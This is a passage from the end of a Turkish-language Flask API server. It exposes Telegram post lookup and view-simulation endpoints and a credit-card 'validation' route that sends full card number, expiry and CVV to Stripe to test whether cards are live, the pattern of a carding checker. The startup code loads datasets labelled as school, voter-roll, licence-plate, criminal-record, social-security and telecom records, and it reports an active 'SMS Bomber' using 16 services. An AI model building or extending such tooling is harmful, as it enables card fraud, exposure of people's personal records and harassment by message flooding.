                'title': sonuc.get('title'),
                'description': sonuc.get('description'),
                'profile_image': sonuc.get('profile_image'),
                'member_count': sonuc.get('member_count'),
                'type': sonuc.get('type'),
                'url': sonuc.get('url')
            }
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Kullanıcı bilgileri alınamadı')
        }), 400

@app.route('/telegram/post/analyze', methods=['GET'])
def telegram_post_analyze_api():
    link = request.args.get('link', '').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/post/analyze?link=https://t.me/username/123'
        }), 400
    
    sonuc = telegram_post_analyze(link)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'post': {
                'chat_identifier': sonuc.get('chat_identifier'),
                'message_id': sonuc.get('message_id'),
                'title': sonuc.get('title'),
                'description': sonuc.get('description'),
                'image': sonuc.get('image'),
                'views': sonuc.get('views'),
                'type': sonuc.get('type'),
                'link': sonuc.get('link')
            }
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Post analiz edilemedi')
        }), 400

@app.route('/telegram/post/view', methods=['GET'])
def telegram_post_view_api():
    link = request.args.get('link', '').strip()
    count = request.args.get('count', '1').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/post/view?link=https://t.me/username/123&count=5'
        }), 400
    
    try:
        count_int = int(count)
        if count_int < 1:
            count_int = 1
        if count_int > 10:
            count_int = 10
    except:
        count_int = 1
    
    sonuc = telegram_post_view_simulate(link, count_int)
    
    return jsonify({
        'durum': 'başarılı',
        'toplam': sonuc['total'],
        'basari': sonuc['success'],
        'basarisiz': sonuc['failed'],
        'link': sonuc['link'],
        'detay': sonuc['results']
    })

# ==================== CC DOĞRULAMA API ====================

@app.route('/cc', methods=['GET'])
def cc_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Kredi Kartı Doğrulama API',
        'stripe_aktif': bool(STRIPE_SECRET_KEY),
        'kullanım': {
            'luhn': '/cc/luhn?kart=4111111111111111',
            'format_kontrol': '/cc/bilgi (POST)',
            'tam_dogrula': '/cc/dogrula (POST)'
        }
    })

@app.route('/cc/luhn', methods=['GET', 'POST'])
def luhn_kontrol_api():
    if request.method == 'GET':
        kart_no = request.args.get('kart', '').strip()
    else:
        data = request.get_json() or {}
        kart_no = data.get('kart_no', '').strip()
    
    kart_no = re.sub(r'\D', '', kart_no)
    if not kart_no:
        return jsonify({'durum': 'hata', 'mesaj': 'Kart numarası girin'}), 400
    
    return jsonify({
        'durum': 'başarılı',
        'kart_no': kart_no,
        'gecerli': luhn_kontrol(kart_no)
    })

@app.route('/cc/bilgi', methods=['POST'])
def kart_bilgi_kontrol():
    data = request.get_json()
    if not data:
        return jsonify({'durum': 'hata', 'mesaj': 'JSON verisi gönderin'}), 400
    
    kart_no = data.get('kart_no', '').strip()
    ay = data.get('ay', '').strip()
    yil = data.get('yil', '').strip()
    cvv = data.get('cvv', '').strip()
    
    if not all([kart_no, ay, yil, cvv]):
        return jsonify({'durum': 'hata', 'mesaj': 'Tüm alanlar zorunlu'}), 400
    
    kart_no = re.sub(r'\D', '', kart_no)
    hatalar = kart_bilgilerini_kontrol(kart_no, ay, yil, cvv)
    
    if hatalar:
        return jsonify({'durum': 'hata', 'hatalar': hatalar}), 400
    
    return jsonify({
        'durum': 'başarılı',
        'mesaj': 'Format geçerli',
        'kart_no': kart_no[-4:]
    })

@app.route('/cc/dogrula', methods=['POST'])
def cc_dogrula():
    data = request.get_json()
    if not data:
        return jsonify({'durum': 'hata', 'mesaj': 'JSON verisi gönderin'}), 400
    
    kart_no = data.get('kart_no', '').strip()
    ay = data.get('ay', '').strip()
    yil = data.get('yil', '').strip()
    cvv = data.get('cvv', '').strip()
    
    if not all([kart_no, ay, yil, cvv]):
        return jsonify({'durum': 'hata', 'mesaj': 'Tüm alanlar zorunlu'}), 400
    
    kart_no = re.sub(r'\D', '', kart_no)
    hatalar = kart_bilgilerini_kontrol(kart_no, ay, yil, cvv)
    
    if hatalar:
        return jsonify({'durum': 'hata', 'hatalar': hatalar}), 400
    
    if not STRIPE_SECRET_KEY:
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'Format geçerli (Stripe pasif)',
            'luhn_gecerli': luhn_kontrol(kart_no),
            'kart_no': kart_no[-4:]
        })
    
    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data={
                'type': 'card',
                'card[number]': kart_no,
                'card[exp_month]': ay,
                'card[exp_year]': yil,
                'card[cvc]': cvv
            },
            headers={
                'Authorization': f'Bearer {STRIPE_SECRET_KEY}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        
        if response.status_code == 200:
            return jsonify({
                'durum': 'başarılı',
                'mesaj': 'Stripe ile doğrulandı',
                'luhn_gecerli': luhn_kontrol(kart_no),
                'kart_no': kart_no[-4:],
                'payment_method_id': response.json().get('id')
            })
        else:
            return jsonify({
                'durum': 'hata',
                'mesaj': response.json().get('error', {}).get('message', 'Stripe hatası')
            }), 400
    except Exception as e:
        return jsonify({'durum': 'hata', 'mesaj': f'Stripe hatası: {str(e)}'}), 500

# ==================== UYGULAMA BAŞLATMA ====================

if __name__ == '__main__':
    print("\n" + "="*50)
    print("📂 VERİLER YÜKLENİYOR...")
    print("="*50)
    
    eokul_verileri_yukle()
    secmen_verileri_yukle()
    plaka_verileri_yukle()
    sicil_verileri_yukle()
    turknet_verileri_yukle()
    papara_verileri_yukle()
    sgk_verileri_yukle()
    universite_verileri_yukle()
    
    print("\n" + "="*50)
    print("📊 API DURUMU")
    print("="*50)
    print(f"   ✅ E-Okul     : {len(eokul_veriler)} kayıt")
    print(f"   ✅ Seçmen     : {len(secmen_veriler)} kayıt")
    print(f"   ✅ Plaka      : {len(plaka_veriler)} kayıt")
    print(f"   ✅ Sicil      : {len(sicil_veriler)} kayıt")
    print(f"   ✅ TurkNet    : {len(turknet_veriler)} kayıt")
    print(f"   ✅ Papara     : {len(papara_veriler)} kayıt")
    print(f"   ✅ SGK        : {len(sgk_veriler)} kayıt")
    print(f"   ✅ Üniversite : {len(universite_veriler)} kayıt")
    print(f"   {'✅' if STRIPE_SECRET_KEY else '❌'} Stripe      : {'Aktif' if STRIPE_SECRET_KEY else 'Pasif'}")
    print(f"   ✅ SMS Bomber : Aktif (16 servis)")
    print(f"   ✅ Telegram   : Token gerektirmez")
    print("="*50)
    print("🚀 SUNUCU BAŞLATILIYOR...")
    print("="*50 + "\n")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
